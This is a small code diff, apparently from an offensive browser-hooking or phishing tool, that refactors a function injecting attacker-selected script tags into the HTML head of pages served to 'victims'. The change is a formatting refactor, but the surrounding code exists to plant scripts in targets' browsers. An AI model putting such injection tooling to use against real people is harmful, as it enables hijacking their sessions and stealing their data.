@@ -47,7 +47,10 @@ def victim_headers(ua):
 def victim_inject_code(html, script = 'a'):
     html = html.replace('</head>', '<script type="text/javascript" src="/static/js/libs.min.js"></script></head>')
     html = html.replace('</head>', '<script type="text/javascript" src="/static/js/base.js"></script></head>')
-    html = html.replace('</head>', '<script type="text/javascript" src="/static/js/' + script + '.js"></script></head>')
+    html = html.replace(
+        '</head>',
+        f'<script type="text/javascript" src="/static/js/{script}.js"></script></head>',
+    )
     return html
 
 def attacks_hook_message(data):
